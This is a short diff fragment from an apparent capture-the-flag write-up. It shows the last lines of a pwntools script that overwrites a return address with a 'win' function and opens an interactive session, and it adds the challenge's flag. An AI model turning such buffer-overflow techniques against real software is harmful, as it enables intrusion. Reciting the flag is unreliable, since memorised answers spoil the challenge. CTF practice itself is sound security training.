@@ -25,3 +25,4 @@ payload += p64(binary.sym.win)
 p.sendlineafter('joke\n',payload)
 p.interactive()
 ```
+FLAG: ``dctf{Ju5t_m0v3_0n}``
